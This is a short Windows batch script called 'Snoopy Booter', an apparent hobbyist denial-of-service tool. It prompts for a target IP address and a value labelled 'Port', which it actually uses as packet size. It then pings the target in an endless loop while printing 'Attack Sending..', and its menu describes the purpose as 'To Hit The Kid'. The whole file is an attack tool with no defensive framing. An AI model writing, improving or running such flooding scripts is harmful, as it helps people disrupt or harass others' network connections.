@echo off
color f
title Snoopy Booter 
mode 67,25
echo 
echo off
color f
:menu
cls
echo.
type Snoop.py
echo.
echo.
echo [40;31m([40;37m1[40;31m)[40;37m To Hit The Kid :)   
goto action                                
:input
echo.
echo Please Enter A Valid Input Option.
echo.
:action
echo.
set /p action=Type [40;31m([40;37m1[40;31m)[40;37m Here: 
if '%action%'=='1' goto boot
goto input



:boot
Set/p PIPI=IP~$ 
Set /p Puffer=Port~$ 

:A
Set /a Send=%Send%+1
ping %PIPI% -l %Puffer% -w 15 -n 1 -4 >NUL
echo Attack Sending.. [40;31m([40;37mSent[40;31m)[40;37m
goto A